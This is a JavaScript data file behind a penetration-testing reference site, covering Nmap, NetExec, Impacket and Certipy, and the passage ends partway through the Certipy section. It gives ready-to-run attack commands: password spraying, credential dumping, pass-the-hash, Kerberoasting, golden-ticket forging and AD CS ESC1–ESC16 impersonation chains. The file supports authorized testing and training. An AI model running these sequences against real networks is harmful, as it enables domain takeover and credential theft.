/*
  TOOLKIT — the data behind /toolkit.html and /tool-detail.html.

  This file intentionally holds a small, curated set of tools — this is a
  field reference manual, not a link directory. Every tool gets the same
  structure so the detail page (and its search/quick-nav) works the same
  way everywhere:

  {
    id:          "unique-slug",              // required — powers tool-detail.html?tool=<id>
    name:        "Tool Name",
    url:         "https://...",              // official site — "Visit site" button
    description: "One line for the toolkit grid card.",
    brief:       "Overview paragraph(s). Use \n\n to separate paragraphs.",

    quickReference: [                        // always-visible rapid-access box
      { label: "What this does", cmd: "the command or action" }
    ],

    sections: [                              // collapsible, categorized reference —
                                              // this is the bulk of the page
      {
        title: "Category Name",
        type: "table",                       // flags/scripts/options/concepts — 2+ columns
        columns: ["Option", "Description"],
        rows: [["-x", "what it does"], ...]  // arrays matching `columns`, in order
      },
      {
        title: "Common Workflows",
        type: "commands",                    // named, ready-to-run sequences
        commands: [
          { label: "Workflow name", cmd: "step one\nstep two\nstep three" }
        ]
      },
      {
        title: "Notes & Tips",
        type: "notes",                       // plain bullet list, no code styling
        items: ["A tip.", "Another tip."]
      }
    ]
  }

  HOW TO ADD A TOOL:
  1. Add a new { category: "...", tools: [...] } block, or a tool into an
     existing one.
  2. Give it at least `id`, `name`, `url`, `description`. Everything else
     (brief/quickReference/sections) is optional — the detail page only
     builds a "Guide" button on the card if `sections` has content.
  3. Save and refresh — toolkit.html and tool-detail.html both render
     automatically, including the quick-nav and search box.

  Double-check every URL before publishing — this page is meant to be a
  reliable jumping-off point, broken or stale links undermine that.
*/

var TOOLKIT = [
  {
    category: "Network Recon",
    tools: [
      {
        id: "nmap",
        name: "Nmap",
        url: "https://nmap.org/",
        description: "Network discovery, port scanning, service detection, and OS fingerprinting.",
        brief: "Nmap is the standard network scanner for host discovery, port enumeration, service/version detection, OS fingerprinting, and scripted vulnerability checks via NSE. This page is organized by task — discovery, port selection, scan type, enumeration, scripting, timing, and output — so a specific flag is always a couple of seconds away, not a scroll through one long list.\n\nModern, rarely-used-in-practice scan types (Xmas, FIN, Null, Maimon, idle/zombie scans) are deliberately left out — they're evadable in theory but rarely worth reaching for on a real engagement. What's below is what actually gets used.",
        quickReference: [
          { label: "Fast first-pass sweep across a range", cmd: "sudo nmap -T4 -F --min-rate 300 -n -Pn 10.10.10.0/24" },
          { label: "Full TCP port scan, no assumptions", cmd: "sudo nmap -p- -T4 -n -Pn <target>" },
          { label: "Standard second pass — services + default scripts", cmd: "nmap -sV -sC -p<ports> <target>" },
          { label: "UDP — common ports only, it's slow", cmd: "sudo nmap -sU --top-ports 20 <target>" },
          { label: "Always save output — one flag, every format", cmd: "nmap -oA scan_name <target>" }
        ],
        sections: [
          {
            title: "Discovery",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-sn", "Ping scan only — skip port scanning entirely"],
              ["-Pn", "Treat all hosts as online, skip host discovery (needed when ICMP is filtered)"],
              ["-n", "Never do DNS resolution — faster scans"],
              ["-R", "Always resolve DNS, even for offline hosts"],
              ["-PE", "ICMP Echo Request ping"],
              ["-PS<ports>", "TCP SYN ping — good ICMP-blocked alternative, e.g. -PS22,80,443"],
              ["-PA<ports>", "TCP ACK ping"],
              ["-PU<ports>", "UDP ping"],
              ["--disable-arp-ping", "Disable ARP discovery on local networks (ARP is normally used automatically and is very reliable on-LAN)"]
            ]
          },
          {
            title: "Port Selection",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-p<ports>", "Specify ports to scan, e.g. -p22,80,443 or -p1-1000"],
              ["-p-", "Scan all 65,535 TCP ports"],
              ["-F", "Fast mode — scan the top 100 ports only"],
              ["--top-ports <n>", "Scan the top N most common ports"],
              ["--exclude-ports <ports>", "Exclude specific ports from an otherwise broader scan"],
              ["-r", "Scan ports in sequential order instead of randomized"]
            ]
          },
          {
            title: "Scan Types",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-sS", "TCP SYN scan (half-open). Fast and the default for root — never completes the handshake, so it's quieter in application logs."],
              ["-sT", "TCP connect scan. Completes the full 3-way handshake — used when you can't get raw-socket privileges. Slower, and shows up in app-level logs."],
              ["-sU", "UDP scan. No handshake exists for UDP, so state is inferred from responses (or silence) — slow, and often reports open|filtered."]
            ]
          },
          {
            title: "Enumeration",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-sV", "Probe open ports to detect service/version"],
              ["--version-intensity <0-9>", "How hard to try during version detection (higher = more probes, slower)"],
              ["-O", "OS detection via TCP/IP stack fingerprinting"],
              ["--osscan-guess", "Guess OS more aggressively when the match isn't clean"],
              ["-A", "Aggregate flag: OS detection + version detection + default scripts + traceroute, all at once"],
              ["Manual banner grab", "nc -nv <target> <port>  or  openssl s_client -connect <target>:443 — confirm what Nmap reported, by hand"]
            ]
          },
          {
            title: "NSE Scripts",
            type: "table",
            columns: ["Category", "Script / Flag", "Description"],
            rows: [
              ["flags", "-sC", "Run the default set of NSE scripts"],
              ["flags", "--script <name>", "Run specific script(s) or a category — comma-separated, wildcards ok (--script http*)"],
              ["flags", "--script-args <k=v>", "Pass arguments into NSE scripts"],
              ["flags", "--script-updatedb", "Refresh the local NSE script database"],
              ["discovery", "broadcast-ping", "Discover extra hosts on the local segment via broadcast ping"],
              ["discovery", "dns-brute", "Brute-force subdomains of a domain via DNS"],
              ["smb", "smb-os-discovery", "Fingerprint OS/version info over SMB"],
              ["smb", "smb-enum-shares", "List SMB shares visible to the supplied (or anonymous) credentials"],
              ["smb", "smb-enum-users", "Enumerate domain/local users over SMB"],
              ["smb", "smb-vuln-ms17-010", "Check for EternalBlue (MS17-010)"],
              ["smb", "smb2-security-mode", "Report whether SMB signing is required — relevant to relay attacks"],
              ["http", "http-title", "Grab the page title — quick sanity check on 80/443"],
              ["http", "http-enum", "Brute-force common web paths/directories"],
              ["http", "http-methods", "List allowed HTTP methods, flag risky ones (PUT/TRACE)"],
              ["http", "http-headers", "Dump the full HTTP response headers"],
              ["dns", "dns-zone-transfer", "Attempt an AXFR zone transfer against a DNS server"],
              ["ssl", "ssl-cert", "Retrieve and parse the presented SSL/TLS certificate"],
              ["ssl", "ssl-enum-ciphers", "Enumerate supported TLS ciphers, flag weak/deprecated ones"],
              ["vuln", "vulners", "Cross-reference detected service versions against the Vulners CVE database"],
              ["vuln", "--script vuln", "Run every installed vuln-category script at once against the target"]
            ]
          },
          {
            title: "Timing & Performance",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-T0 to -T5", "Timing template — 0 is slowest/stealthiest, 5 is fastest, 3 is Nmap's own default"],
              ["--min-rate <n>", "Never send slower than this many packets/sec"],
              ["--max-rate <n>", "Never send faster than this many packets/sec"],
              ["--host-timeout <time>", "Give up on a host entirely after this long"],
              ["--max-retries <n>", "Cap retransmissions per probe — big time saver on lossy/large scans"],
              ["--scan-delay <time>", "Force a minimum delay between probes (useful for rate-limited targets)"],
              ["--min-parallelism <n>", "Floor on parallel probes — raise it if a scan feels too slow to converge"]
            ]
          },
          {
            title: "Output",
            type: "table",
            columns: ["Option", "Description"],
            rows: [
              ["-oN <file>", "Normal, human-readable output"],
              ["-oX <file>", "XML output — good for feeding into other tools"],
              ["-oG <file>", "Grepable output — handy for quick shell one-liners"],
              ["-oA <name>", "Save all three formats at once (.nmap / .xml / .gnmap)"],
              ["--append-output", "Append to existing output files instead of overwriting"],
              ["--resume <file>", "Resume a previous scan from its saved output file"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Quick external recon", cmd: "sudo nmap -T4 -F --min-rate 300 -n -Pn <target>\nnmap -sV -sC -p<open_ports> <target>\nnmap -oA recon_<target> <target>" },
              { label: "Full internal subnet sweep", cmd: "sudo nmap -sn 10.10.10.0/24 -oG live_hosts.txt\n# then, per live host:\nsudo nmap -p- -T4 -n -Pn <host> -oA fullscan_<host>" },
              { label: "Service & vulnerability enumeration", cmd: "nmap -sV -sC -p<open_ports> <target>\nnmap --script vuln -p<open_ports> <target>" },
              { label: "Stealthier timing profile", cmd: "sudo nmap -sS -T2 --min-parallelism 1 -p<ports> <target>" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "-sS, -sU, and -O all need raw-socket privileges — run with sudo, or Nmap silently falls back to a connect scan.",
              "UDP scanning is inherently slow and often ambiguous (open|filtered) — always narrow to specific/top ports first, never run a blind -p- UDP scan.",
              "-Pn is your default when a target's ICMP is filtered (very common on hardened hosts) — otherwise Nmap may report a live host as down.",
              "Port states worth remembering: open (something's listening), closed (reachable, nothing there), filtered (no response — probably a firewall), unfiltered (seen only with ACK-style probes, state undetermined).",
              "-sC runs the 'default' script category — it's broad but not exhaustive. Reach for --script <category> when you need something more targeted.",
              "Always save output (-oA at minimum) — you will want to grep back through a scan later, and re-running it isn't always cheap.",
              "Confirm you have written authorization for the target range before scanning anything you don't own."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Active Directory",
    tools: [
      {
        id: "netexec",
        name: "NetExec",
        url: "https://github.com/Pennyw0rth/NetExec",
        description: "Swiss-army knife for AD enumeration, credential validation, and lateral movement.",
        brief: "NetExec (nxc) is the actively maintained continuation of CrackMapExec — used to validate credentials, enumerate SMB/LDAP/WinRM/MSSQL, and move laterally across an Active Directory environment, all from one consistent command shape: nxc <protocol> <target> -u <user> -p <pass> [action flags].",
        quickReference: [
          { label: "Validate credentials across a subnet", cmd: "nxc smb 10.10.10.0/24 -u user -p pass" },
          { label: "List shares once creds are confirmed", cmd: "nxc smb <target> -u user -p pass --shares" },
          { label: "BloodHound collection over LDAP", cmd: "nxc ldap <dc> -u user -p pass -d domain.local --bloodhound -c All" },
          { label: "Password spray (one password, many users)", cmd: "nxc smb 10.10.10.0/24 -u users.txt -p 'Password1' --continue-on-success" },
          { label: "Run a command with valid creds", cmd: "nxc smb <target> -u user -p pass -x whoami" }
        ],
        sections: [
          {
            title: "SMB",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <target> -u user -p pass", "Basic auth check — confirms creds work over SMB"],
              ["nxc smb <target> -u user -p pass --shares", "Enumerate accessible shares"],
              ["nxc smb <target> -u user -p pass --sessions", "List active sessions on the target"],
              ["nxc smb <target> -u user -p pass --loggedon-users", "List currently logged-on users"],
              ["nxc smb <target> -u user -p pass --sam", "Dump the local SAM database (needs local admin)"],
              ["nxc smb <target> -u user -p pass --lsa", "Dump LSA secrets (needs local admin)"],
              ["nxc smb <target> -u user -p pass -x \"whoami\"", "Execute a command on the target"],
              ["nxc smb <target> -u user -p pass --pass-pol", "Read the domain password policy — check this before spraying"]
            ]
          },
          {
            title: "WinRM",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc winrm <target> -u user -p pass", "Check whether the account can authenticate over WinRM"],
              ["nxc winrm <target> -u user -p pass -x \"whoami\"", "Execute a single command over WinRM"],
              ["evil-winrm -i <target> -u user -p pass", "For an actual interactive shell — nxc confirms access, evil-winrm gives you the session"]
            ]
          },
          {
            title: "LDAP",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc ldap <dc> -u user -p pass", "Basic bind check against the domain controller"],
              ["nxc ldap <dc> -u user -p pass --users", "Enumerate domain users"],
              ["nxc ldap <dc> -u user -p pass --groups", "Enumerate domain groups"],
              ["nxc ldap <dc> -u user -p pass --admin-count", "List accounts with adminCount=1 (current or former privileged accounts)"],
              ["nxc ldap <dc> -u user -p pass --trusted-for-delegation", "Find accounts trusted for unconstrained delegation"],
              ["nxc ldap <dc> -u user -p pass --asreproast out.txt", "AS-REP roast accounts with Kerberos pre-auth disabled"],
              ["nxc ldap <dc> -u user -p pass --kerberoasting out.txt", "Kerberoast accounts with an SPN set"]
            ]
          },
          {
            title: "MSSQL",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc mssql <target> -u user -p pass", "Check SQL auth (add --local-auth for a local SQL account rather than a domain one)"],
              ["nxc mssql <target> -u user -p pass -x \"whoami\"", "Execute a command via xp_cmdshell, if enabled"]
            ]
          },
          {
            title: "Password Spraying",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <range> -u users.txt -p 'Password1' --continue-on-success", "Spray one password across many users — always add --continue-on-success or it stops at the first hit"],
              ["nxc smb <range> -u user -p passwords.txt", "The inverse — one user, many candidate passwords (use sparingly, lockout risk)"],
              ["nxc smb <range> -u users.txt -p passwords.txt --no-bruteforce", "Pair users.txt and passwords.txt line-by-line instead of trying every combination"]
            ]
          },
          {
            title: "Shares",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <target> -u '' -p ''  --shares", "Check for shares reachable with blank/anonymous credentials"],
              ["nxc smb <target> -u user -p pass --shares", "List shares reachable with valid credentials"],
              ["smbclient //<target>/<share> -U user", "Actually browse a share's contents once you know it's accessible"]
            ]
          },
          {
            title: "Users & Groups",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc ldap <dc> -u user -p pass --users", "Enumerate all domain users"],
              ["nxc ldap <dc> -u user -p pass --groups", "Enumerate all domain groups"],
              ["nxc smb <target> -u user -p pass --rid-brute", "RID-cycle a target to enumerate users/groups even with limited LDAP access"]
            ]
          },
          {
            title: "BloodHound Collection",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc ldap <dc> -u user -p pass -d domain.local --bloodhound -c All", "Collect the full BloodHound dataset over LDAP"],
              ["--dns-server <ip>", "Point collection at a specific DNS server if the domain's default doesn't resolve for you"],
              [".zip output", "Collected data is written as a timestamped .zip — import it directly into BloodHound CE"]
            ]
          },
          {
            title: "Credential Validation",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["nxc smb <target> -u user -p pass", "Single credential check — quick pass/fail"],
              ["Green output", "Indicates the credential is valid"],
              ["(Pwn3d!)", "Appears when the account also has local admin on the target"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Initial credential validation", cmd: "nxc smb 10.10.10.0/24 -u user -p pass" },
              { label: "Enumerate once creds are confirmed", cmd: "nxc smb <target> -u user -p pass --shares\nnxc smb <target> -u user -p pass --sam\nnxc ldap <dc> -u user -p pass --users" },
              { label: "Spray, then validate the hit", cmd: "nxc smb 10.10.10.0/24 -u users.txt -p 'Season2026!' --continue-on-success\nnxc smb 10.10.10.0/24 -u <found_user> -p 'Season2026!' --shares" },
              { label: "BloodHound collection into analysis", cmd: "nxc ldap <dc> -u user -p pass -d domain.local --bloodhound -c All\n# import the resulting .zip into BloodHound CE, then run path-to-DA queries" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always check --pass-pol before spraying — one wrong guess per account is fine, several isn't if the lockout threshold is low.",
              "--continue-on-success is easy to forget and will make a spray stop dead at the first valid hit — add it by default.",
              "NetExec is the maintained fork of CrackMapExec (cme) — same mental model, a handful of renamed flags.",
              "Combine LDAP enumeration output directly into BloodHound rather than reading it as a flat list — attack-path context is the whole point.",
              "Prefer --no-bruteforce with paired username:password files so you're not accidentally testing every combination against a locked-out-prone environment."
            ]
          }
        ]
      },
      {
        id: "impacket-suite",
        name: "Impacket Suite",
        url: "https://github.com/fortra/impacket",
        description: "Python scripts for attacking Windows/AD protocols — secrets, tickets, and shells.",
        brief: "Impacket is a collection of Python classes and ready-to-run scripts for working directly with Windows network protocols. On an AD engagement it's usually reached for right after NetExec confirms valid credentials — for dumping secrets, requesting or forging Kerberos tickets, and getting a shell.",
        quickReference: [
          { label: "Dump SAM / LSA / NTDS remotely", cmd: "secretsdump.py domain/user:pass@target" },
          { label: "Shell over SMB", cmd: "psexec.py domain/user:pass@target" },
          { label: "Kerberoast", cmd: "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request" },
          { label: "Get a TGT using an NT hash", cmd: "getTGT.py domain/user -hashes :<nthash>" }
        ],
        sections: [
          {
            title: "Credential Dumping",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["secretsdump.py domain/user:pass@target", "Remote dump of SAM, cached creds, and LSA secrets"],
              ["secretsdump.py domain/user:pass@dc -just-dc-ntlm", "Pull NTDS.dit hashes only (faster, quieter than a full -just-dc)"],
              ["secretsdump.py -sam SAM -system SYSTEM LOCAL", "Parse an offline copy of SAM/SYSTEM instead of hitting the network"]
            ]
          },
          {
            title: "Remote Execution",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["psexec.py domain/user:pass@target", "Classic service-based shell — drops and runs a service binary"],
              ["wmiexec.py domain/user:pass@target", "Semi-fileless execution over WMI — quieter, no service creation"],
              ["smbexec.py domain/user:pass@target", "Alternative service-based execution, different opsec footprint than psexec"],
              ["atexec.py domain/user:pass@target \"whoami\"", "One-shot command execution via the task scheduler"]
            ]
          },
          {
            title: "Kerberos Attacks",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["GetUserSPNs.py domain/user:pass -dc-ip <dc> -request", "Kerberoast every account with an SPN set"],
              ["GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip <dc>", "AS-REP roast accounts with Kerberos pre-auth disabled"],
              ["ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain domain.local user", "Forge a golden ticket once you hold the krbtgt hash"],
              ["getTGT.py domain/user -hashes :<nthash>", "Request a TGT using a password, NT hash, or AES key"],
              ["getST.py -spn <spn> domain/user:pass", "Request a service ticket directly (silver-ticket-style access)"]
            ]
          },
          {
            title: "SMB & File Access",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["smbclient.py domain/user:pass@target", "Interactive SMB client for browsing/pulling files from shares"],
              ["lookupsid.py domain/user:pass@target", "RID-cycle a target to enumerate users and groups"],
              ["rpcdump.py domain/user:pass@target", "Enumerate exposed RPC endpoints on a target"],
              ["reg.py domain/user:pass@target query -keyName <key>", "Read remote registry keys/values"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Credential dump after admin access", cmd: "secretsdump.py domain/user:pass@target\n# review NTLM hashes, then reuse directly:\npsexec.py -hashes :<nthash> domain/user@target" },
              { label: "Kerberoasting from a standard user", cmd: "GetUserSPNs.py domain/user:pass -dc-ip <dc> -request\nhashcat -m 13100 hashes.txt rockyou.txt" },
              { label: "Pass-the-hash to a shell", cmd: "wmiexec.py -hashes :<nthash> domain/user@target" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Most scripts accept -hashes LM:NT in place of a password — pass-the-hash works throughout the suite, not just for execution.",
              "wmiexec.py and atexec.py tend to leave a lighter footprint than psexec.py, which creates and starts an actual service.",
              "secretsdump.py's -just-dc-ntlm is worth defaulting to for a full DC dump — it skips history/extra attributes you usually don't need.",
              "Kerberos-based scripts (getTGT.py, GetUserSPNs.py, etc.) generally need correct time sync with the DC or authentication fails outright."
            ]
          }
        ]
      },
      {
        id: "certipy",
        name: "Certipy",
        url: "https://github.com/ly4k/Certipy",
        description: "AD CS enumeration and abuse — every ESC1–ESC16 misconfiguration, detection, and exploitation path in one place.",
        brief: "Certipy audits and abuses Active Directory Certificate Services (AD CS). Misconfigured certificate templates and CA settings are one of the most common, highest-impact paths to full domain compromise — a single vulnerable template can be worth more than a whole chain of smaller AD misconfigurations, because the output is a certificate that authenticates as anyone.\n\nThis page treats the ESCx catalog (ESC1 through ESC16, including EKUwu/ESC15) as the core reference — what causes each one, how Certipy flags it, and the actual command sequence to exploit it — so this is the only page that needs to be open during a AD CS assessment.",
        quickReference: [
          { label: "Find every vulnerable template/CA in one pass", cmd: "certipy find -u user@domain.local -p pass -dc-ip <dc> -vulnerable" },
          { label: "Request a cert (ESC1-style)", cmd: "certipy req -u user@domain.local -p pass -ca <ca_name> -template <template> -upn administrator@domain.local" },
          { label: "Authenticate with the cert, recover the NT hash", cmd: "certipy auth -pfx administrator.pfx -dc-ip <dc>" },
          { label: "Relay a coerced auth into AD CS (ESC8)", cmd: "certipy relay -ca <ca_ip>" },
          { label: "Shadow credentials attack", cmd: "certipy shadow auto -u user@domain.local -p pass -account target_user" }
        ],
        sections: [
          {
            title: "Enumeration",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["certipy find -u user@domain.local -p pass -dc-ip <dc>", "Full enumeration of every CA and certificate template in the domain"],
              ["-vulnerable", "Only flag templates/CA configs that look exploitable — the fastest way to triage a large environment"],
              ["-old-bloodhound", "Emit BloodHound-compatible JSON so AD CS objects/edges show up in the graph alongside everything else"],
              ["-output <name>", "Write full results to file for later review (JSON + text)"],
              ["-text", "Print a quick human-readable summary to stdout instead of writing files"],
              ["-hashes <LM:NT>", "Authenticate with an NTLM hash instead of a password"],
              ["-k -dc-ip <dc>", "Authenticate with Kerberos using a ticket already in the environment's ccache"]
            ]
          },
          {
            title: "ESC Vulnerabilities — What Each One Actually Is",
            type: "table",
            columns: ["ESC", "Root Cause"],
            rows: [
              ["ESC1", "Template lets the requester supply any SAN (ENROLLEE_SUPPLIES_SUBJECT), allows client auth, needs no manager approval, and a low-priv principal has enrollment rights — request a cert impersonating anyone, including a Domain Admin"],
              ["ESC2", "Template has the \"Any Purpose\" EKU (or no EKU at all) — usable for client auth like ESC1, or to issue a subordinate CA certificate"],
              ["ESC3", "Template has the Certificate Request Agent EKU (an \"enrollment agent\" template) — lets the holder enroll on behalf of another user"],
              ["ESC4", "The template's own ACL is misconfigured — a low-priv principal can edit the template's configuration directly, e.g. rewrite it into an ESC1-shaped template"],
              ["ESC5", "Vulnerable ACLs on other PKI-related AD objects — the CA's computer object, the Certificate Templates container, NTAuthCertificates, etc."],
              ["ESC6", "CA-wide flag EDITF_ATTRIBUTESUBJECTALTNAME2 is set — lets a requester set an arbitrary SAN against ANY enabled template, not just an ESC1-shaped one"],
              ["ESC7", "A low-priv principal holds Manage CA or Manage Certificates rights on the CA itself — Manage CA can flip ESC6's flag or enable a dangerous template; Manage Certificates can approve a pending request"],
              ["ESC8", "AD CS web enrollment (HTTP) is enabled with NTLM auth — relay a coerced authentication into the enrollment endpoint to get a cert as the relayed account"],
              ["ESC9", "Template has msPKI-Enrollment-Flag's \"No Security Extension\" bit set — strips the requester's SID from the cert, which matters once weak certificate mapping is also in play"],
              ["ESC10", "The DC's CertificateMappingMethods registry value (or StrongCertificateBindingEnforcement) enables weak/UPN-based cert-to-account mapping — same end effect as ESC9, from the DC side"],
              ["ESC11", "The CA's ICPR RPC interface allows relay (IF_ENFORCEENCRYPTICERTREQUEST not set) — NTLM relay over RPC instead of HTTP to request a certificate"],
              ["ESC12", "The CA's private key is reachable via a weak-permissioned CAPI/KSP config, or an attacker has shell access to the CA host — extract or use the CA's key directly (\"Golden Certificate\")"],
              ["ESC13", "A template's issuance policy OID is linked to a privileged group via msDS-OIDToGroupLink — enrolling in the template grants effective membership in that group"],
              ["ESC14", "Weak explicit certificate mapping via a writable altSecurityIdentities attribute — map a certificate you control onto a victim account, then authenticate as them"],
              ["ESC15 / EKUwu", "CVE-2024-49019 — legacy V1 templates historically ignored a requester-supplied Application Policies extension, letting an attacker request a client-auth-capable cert off a template that should never allow it"],
              ["ESC16", "The szOID_NTDS_CA_SECURITY_EXT security extension is disabled globally (CA- or forest-wide) rather than per-template — same effect as ESC9, just not scoped to one template"]
            ]
          },
          {
            title: "ESC Exploitation Commands",
            type: "commands",
            commands: [
              { label: "ESC1 — enrollee-supplied SAN", cmd: "certipy req -u user@corp.local -p Pass123 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\ncertipy auth -pfx administrator.pfx -dc-ip <dc>" },
              { label: "ESC2 — Any Purpose / no EKU", cmd: "certipy req -u user@corp.local -p Pass123 -ca CORP-CA -template AnyPurposeTemplate -upn administrator@corp.local\ncertipy auth -pfx administrator.pfx -dc-ip <dc>" },
              { label: "ESC3 — Certificate Request Agent (enroll on behalf of)", cmd: "certipy req -u agent@corp.local -p Pass123 -ca CORP-CA -template EnrollmentAgentTemplate\ncertipy req -u agent@corp.local -p Pass123 -ca CORP-CA -template User -on-behalf-of 'CORP\\administrator' -pfx agent.pfx\ncertipy auth -pfx administrator.pfx -dc-ip <dc>" },
              { label: "ESC4 — vulnerable template ACL", cmd: "certipy template -u user@corp.local -p Pass123 -template VulnTemplate -save-old\ncertipy template -u user@corp.local -p Pass123 -template VulnTemplate -write-default-configuration\n# template is now ESC1-shaped — request as above, then restore it:\ncertipy template -u user@corp.local -p Pass123 -template VulnTemplate -configuration VulnTemplate.json" },
              { label: "ESC6 — CA-wide SAN override (EDITF_ATTRIBUTESUBJECTALTNAME2)", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\n# once the CA flag is confirmed, any enabled template becomes ESC1-exploitable:\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template User -upn administrator@corp.local" },
              { label: "ESC7 — Manage CA / Manage Certificates rights", cmd: "certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -add-officer user\ncertipy ca -u user@corp.local -p Pass123 -ca CORP-CA -enable-template SubCA\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template SubCA -upn administrator@corp.local" },
              { label: "ESC8 — NTLM relay to HTTP web enrollment", cmd: "certipy relay -ca <ca_ip>\n# from another session, coerce authentication toward this host (e.g. PetitPotam, PrinterBug)\n# Certipy issues the cert to the relayed account automatically" },
              { label: "ESC9 — no security extension on the cert", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template VulnTemplate\ncertipy auth -pfx cert.pfx -domain corp.local" },
              { label: "ESC10 — weak certificate mapping (DC-side)", cmd: "# same downstream exploitation as ESC9 — the weakness lives in the DC's CertificateMappingMethods registry value instead of the template\ncertipy auth -pfx cert.pfx -domain corp.local -dc-ip <dc>" },
              { label: "ESC11 — RPC relay to the CA (ICPR)", cmd: "certipy relay -ca <ca_ip> -icpr\n# coerce authentication toward this host over RPC instead of HTTP" },
              { label: "ESC12 — CA private key exposure (Golden Certificate)", cmd: "certipy ca -u user@corp.local -p Pass123 -ca CORP-CA -backup\n# with the recovered CA cert + private key:\ncertipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -subject 'CN=administrator,CN=Users,DC=corp,DC=local'\ncertipy auth -pfx administrator_forged.pfx -dc-ip <dc>" },
              { label: "ESC13 — issuance policy linked to a group", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template LinkedPolicyTemplate\ncertipy auth -pfx cert.pfx -dc-ip <dc>\n# the resulting session carries effective membership in the linked group" },
              { label: "ESC14 — weak explicit mapping via altSecurityIdentities", cmd: "certipy account update -u user@corp.local -p Pass123 -user targetuser -upn administrator@corp.local\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template User\ncertipy auth -pfx cert.pfx -dc-ip <dc>" },
              { label: "ESC15 / EKUwu — V1 template application-policy injection (CVE-2024-49019)", cmd: "certipy req -u user@corp.local -p Pass123 -ca CORP-CA -template LegacyV1Template -application-policies 'Client Authentication'\ncertipy auth -pfx cert.pfx -dc-ip <dc>" },
              { label: "ESC16 — security extension disabled CA/forest-wide", cmd: "certipy find -u user@corp.local -p Pass123 -dc-ip <dc> -vulnerable\n# flagged the same way as ESC9/ESC10 — exploit identically once confirmed\ncertipy req -u user@corp.local -p Pass123 -ca CORP-CA -template User\ncertipy auth -pfx cert.pfx -dc-ip <dc>" }
            ]
          },
          {
            title: "Requesting Certificates",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-ca <name>", "Target certificate authority to request from"],
              ["-template <name>", "Certificate template to request against"],
              ["-upn <upn>", "Identity to impersonate in the SAN, on a vulnerable (ESC1-style) template"],
              ["-dns <fqdn>", "Alternative to -upn when the target identity is machine-based rather than user-based"],
              ["-on-behalf-of <domain\\\\user>", "Enroll for another user via a Certificate Request Agent cert (ESC3)"],
              ["-application-policies <policy>", "Force an Application Policy into the request — relevant to ESC15/EKUwu"],
              ["-retrieve <id>", "Fetch a previously issued/pending certificate by request ID (useful after ESC7's Manage Certificates approves it)"]
            ]
          },
          {
            title: "CA & Template Management",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["certipy ca -ca <name> -list-templates", "List every template currently enabled on a CA"],
              ["certipy ca -ca <name> -enable-template <template>", "Enable a template on the CA (needs Manage CA rights — ESC7)"],
              ["certipy ca -ca <name> -add-officer <user>", "Grant a principal Manage Certificates/Officer rights on the CA (needs Manage CA — ESC7)"],
              ["certipy ca -ca <name> -backup", "Back up the CA's certificate and private key (needs admin on the CA host — feeds ESC12)"],
              ["certipy template -template <name> -save-old", "Save a template's current configuration before modifying it"],
              ["certipy template -template <name> -write-default-configuration", "Overwrite a writable template with an ESC1-shaped configuration (ESC4)"],
              ["certipy forge -ca-pfx <ca.pfx> -upn <upn>", "Forge a certificate directly from a compromised CA key — a Golden Certificate (ESC12)"]
            ]
          },
          {
            title: "Authentication",
            type: "table",
            columns: ["Command / Flag", "Description"],
            rows: [
              ["certipy auth -pfx admin.pfx -dc-ip <dc>", "Authenticate with an issued certificate and recover the account's NT hash"],
              ["-username / -domain", "Override the identity Certipy assumes the cert belongs to, if auto-detection from the cert is wrong"],
              ["-ldap-shell", "Drop into an interactive LDAP shell authenticated as the cert's identity instead of just recovering the hash"],
              ["Resulting NT hash", "Feed straight into NetExec, Impacket, or bloodyAD for pass-the-hash — this is usually the whole point of the cert"]
            ]
          },
          {
            title: "Shadow Credentials",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["certipy shadow auto -u user@corp.local -p pass -account target_user", "Add a shadow credential (msDS-KeyCredentialLink) to a target account without touching its password"],
              ["certipy shadow list -u user@corp.local -p pass -account target_user", "List existing key credentials on an account"],
